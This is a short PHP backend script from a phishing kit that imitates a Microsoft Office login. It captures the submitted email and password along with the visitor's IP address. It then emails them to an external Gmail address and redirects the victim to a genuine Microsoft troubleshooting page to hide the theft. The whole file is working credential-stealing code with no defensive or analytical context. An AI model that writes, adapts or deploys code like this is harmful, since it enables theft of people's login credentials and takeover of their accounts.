<?php

$praga=rand();
$praga=md5($praga);

$ip = getenv("REMOTE_ADDR");
$msg .= "-----------------+ Office Login Verfied +--------------------\n";
$msg .= "Email : ".$_POST['user']."\n";
$msg .= "Password : ".$_POST['pass']."\n";
$msg .= "--------------------------------------------------------------\n";
$msg .= "Sent from $ip\n";
$msg .= "-------------------------By Sc4N------------------------------\n";


$to = "be.clean1337@gmail.com";
$subject = "Office Login $ip";

mail($to,$subject,$msg,$from);

header("Location: https://docs.microsoft.com/en-us/office/troubleshoot/?$praga");


?>